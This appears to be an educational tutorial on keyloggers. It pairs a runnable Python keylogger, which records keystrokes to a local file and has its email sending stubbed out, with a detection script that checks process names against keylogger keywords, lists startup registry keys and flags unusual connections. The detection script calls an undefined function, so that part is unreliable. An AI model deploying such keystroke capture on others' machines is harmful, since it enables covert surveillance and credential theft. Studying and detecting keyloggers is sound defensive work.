### What is a Keylogger?

A keylogger is surveillance software or hardware that records keystrokes on a computer. They can be:

- **Software-based** (programs running on the target system)

- **Hardware-based** (physical devices connected to keyboards)

---------

### **Keylogger Example :**


```
import keyboard
import smtplib
from threading import Timer
from datetime import datetime
import os

class EducationalKeylogger:
    def __init__(self, interval=60, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.filename = f"keylog_{self.start_dt.strftime('%Y%m%d_%H%M%S')}.txt"
        
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        
        self.log += name
    
    def report_to_file(self):
        if self.log:
            with open(self.filename, "a", encoding="utf-8") as f:
                print(f"{datetime.now()} - {self.log}", file=f)
            self.log = ""
    
    def send_email(self, email, password, message):
        # This would require proper email configuration
        # Removed for security reasons - never hardcode credentials
        pass
    
    def report(self):
        if self.report_method == "file":
            self.report_to_file()
        
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{self.filename} started")
        keyboard.wait()

# DISCLAIMER AND USAGE WARNING
if __name__ == "__main__":
    print("""
    ⚠️  EDUCATIONAL KEYLOGGER DEMONSTRATION ⚠️
    
    THIS IS FOR EDUCATIONAL PURPOSES ONLY!
    
    LEGAL WARNINGS:
    - Only use on systems you own
    - Never deploy without explicit written consent
    - Unauthorized use is illegal and unethical
    - This demonstration logs to a local file only
    
    This code demonstrates how keyloggers work for
    cybersecurity education and defensive purposes.
    """)
    
    consent = input("Do you understand and accept responsibility? (yes/no): ")
    if consent.lower() == 'yes':
        keylogger = EducationalKeylogger(interval=10, report_method="file")
        keylogger.start()
    else:
        print("Program terminated. Responsible use is required.")
```

------------
## **Detection :** 


```
# enhanced_detection.py - More comprehensive keylogger detection
import psutil
import os
import winreg  # Windows registry access

def enhanced_detection():
    """More comprehensive keylogger detection"""
    
    suspicious_keywords = [
        'keylog', 'logger', 'hook', 'keyboard', 'capture', 
        'spy', 'monitor', 'track', 'record', 'sniff'
    ]
    
    suspicious_processes = []
    
    # Check running processes
    for proc in psutil.process_iter(['name', 'exe', 'cpu_percent', 'memory_info']):
        try:
            proc_name = proc.info['name'].lower()
            proc_exe = proc.info['exe'].lower() if proc.info['exe'] else ""
            
            # Check name and executable path
            for keyword in suspicious_keywords:
                if (keyword in proc_name or 
                    keyword in proc_exe or 
                    keyword in str(proc.info.get('memory_info', '')).lower()):
                    
                    suspicious_processes.append({
                        'name': proc.info['name'],
                        'exe': proc.info['exe'],
                        'pid': proc.pid,
                        'cpu': proc.info['cpu_percent'],
                        'memory': proc.info['memory_info']
                    })
                    break
                    
        except (psutil.NoSuchProcess, psutil.AccessDenied, AttributeError):
            pass
    
    return suspicious_processes

def check_windows_registry_startup():
    """Check Windows Registry startup locations"""
    registry_locations = [
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce")
    ]
    
    startup_items = []
    
    for hive, subkey in registry_locations:
        try:
            with winreg.OpenKey(hive, subkey) as key:
                i = 0
                while True:
                    try:
                        name, value, type = winreg.EnumValue(key, i)
                        startup_items.append({'hive': hive, 'name': name, 'value': value})
                        i += 1
                    except WindowsError:
                        break
        except FileNotFoundError:
            continue
    
    return startup_items

def analyze_network_connections():
    """Check for suspicious network connections"""
    suspicious_connections = []
    
    try:
        for conn in psutil.net_connections():
            if conn.status == 'ESTABLISHED' and conn.raddr:
                # Look for connections on unusual ports
                if conn.raddr.port not in [80, 443, 53, 21, 22, 25]:
                    process_name = psutil.Process(conn.pid).name() if conn.pid else "Unknown"
                    suspicious_connections.append({
                        'pid': conn.pid,
                        'process': process_name,
                        'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}",
                        'status': conn.status
                    })
    except (psutil.AccessDenied, psutil.NoSuchProcess):
        pass
    
    return suspicious_connections

if __name__ == "__main__":
    print("🔍 Enhanced Keylogger Detection")
    print("\n📊 Suspicious Processes:")
    processes = enhanced_detection()
    for proc in processes:
        print(f"   ⚠️  {proc['name']} (PID: {proc['pid']})")
    
    print("\n🏠 Startup Locations:")
    startup_locs = check_autostart_locations()
    for loc in startup_locs:
        print(f"   📁 {loc}")
    
    print("\n🌐 Suspicious Network Connections:")
    connections = analyze_network_connections()
    for conn in connections[:5]:  # Show first 5
        print(f"   🔗 {conn['process']} → {conn['remote_address']}")
    
    if not any([processes, connections]):
        print("\n✅ No obvious keylogger activity detected")
    else:
        print("\n🚨 Suspicious activity found! Investigate further.")
```